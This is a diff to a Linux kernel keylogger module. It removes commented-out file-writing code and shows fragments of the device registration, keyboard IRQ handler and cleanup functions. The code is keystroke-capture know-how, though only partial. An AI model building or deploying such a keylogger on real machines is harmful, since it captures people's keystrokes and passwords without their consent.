@@ -7,7 +7,6 @@ MODULE_DESCRIPTION("Module keylog");
 t_keylst	*k_lst = NULL;
 int		key_read_done = 0;
 int		log_read_done = 0;
-//struct file *fp = (struct file *) NULL;
 
 static ssize_t	key_read(struct file *filep, char *buffer, size_t len, loff_t *offset)
 {
@@ -29,20 +28,10 @@ static ssize_t	log_read(struct file *filep, char *buffer, size_t len, loff_t *of
 	return log_read_done = 0;
 }
 
-/*
-static ssize_t	key_write(struct file *filep, const char *buffer, size_t len, loff_t *offset)
-{
-	ssize_t ret;
-	ret = vfs_write(fp, "test", 4, offset);
-	printk(KERN_INFO "keylogger: in the write call");
-	return ret;
-}
-*/
 static struct file_operations	key_ops = {
 
 	.owner = THIS_MODULE,
 	.read = key_read,
-	//.write = key_write
 };
 
 static struct file_operations	log_ops = {
@@ -80,9 +69,6 @@ static irqreturn_t 	kbd_irq_handler(int irq, void* dev_id)
 
 static int		__init keylogger_init(void)
 {
-	
-//	fp = filp_open(FILE_NAME, O_CREAT | O_RDWR, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
-
 	if (misc_register(&key_dev))
 		return 1;
 	if (misc_register(&log_dev))
@@ -98,7 +84,6 @@ static int		__init keylogger_init(void)
 static void		__exit keylogger_exit(void)
 {
 	free_irq(KBD_IRQ, (void *)kbd_irq_handler);
-	//filp_close(fp, NULL);
 	misc_deregister(&key_dev);
 	misc_deregister(&log_dev);
 }
